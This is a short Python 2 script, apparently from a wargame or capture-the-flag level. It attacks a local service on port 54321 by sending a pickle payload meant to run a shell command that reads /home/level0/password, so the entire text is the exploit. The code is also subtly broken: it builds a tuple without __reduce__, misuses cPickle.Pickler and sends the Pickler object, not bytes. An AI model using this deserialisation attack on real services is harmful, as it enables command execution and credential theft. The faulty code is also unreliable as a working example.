import socket
import cPickle
import os

def serial():
    return (os.system,'cat /home/level0/password')

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('127.0.0.1',54321))
s.recv(16)
src=0
exp=cPickle.Pickler(serial())
s.send(exp)


